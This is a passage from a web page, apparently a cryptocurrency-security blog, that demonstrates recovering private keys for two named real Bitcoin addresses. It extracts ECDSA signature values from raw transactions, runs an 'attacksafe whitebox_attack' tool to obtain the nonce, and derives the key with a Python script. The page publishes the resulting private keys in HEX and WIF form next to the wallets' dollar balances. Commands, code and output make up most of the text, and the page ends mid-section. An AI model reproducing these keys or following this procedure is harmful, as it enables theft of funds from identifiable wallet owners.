<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1687"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY">https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-28-1024x461.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1605"><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 607.79</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong>6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</strong></a>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba">https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-29-1024x135.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1609"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-30-1024x287.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1611"></figure>



<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-31-1024x359.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1613"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-32-1024x491.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1614"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd

RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-33-1024x92.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1616"></figure>



<p><code>(0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
point2gen  =   (0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd
R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-34.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1618"></figure>



<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1688"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY">https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1621"><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 607.79</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№2</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>



<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-2-1024x201.png" alt="WhiteBox Attack" class="wp-image-1527"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-3-1024x202.png" alt="WhiteBox Attack" class="wp-image-1529"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-35-1024x144.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1624"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-36-1024x303.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1626"></figure>



<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-37-1024x264.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1628"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-38-1024x374.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1630"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e

RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-39-1024x89.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1632"></figure>



<p><code>(0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
point2gen  =   (0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e
R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-40.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1634"></figure>



<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1690"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9">https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-42-1024x465.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1638"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 635.44</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener">f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



